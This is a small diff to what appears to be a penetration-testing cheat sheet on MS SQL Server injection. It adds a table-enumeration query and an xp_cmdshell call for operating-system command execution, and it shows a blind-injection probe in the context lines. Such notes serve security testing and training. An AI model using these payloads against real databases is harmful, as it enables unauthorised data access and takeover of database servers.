@@ -35,6 +35,10 @@ MsSql attacks
 
         If the DB runs as sa, you can run XP_CMDSHELL to get code execution.
 
+    Useful queries:
+        SELECT Distinct TABLE_NAME FROM information_schema.TABLES
+        exec master.dbo.xp_cmdshell 'CMD'
+
 Blind MsSqlI
     For numeric contexts (look for differences):
         and 1=1
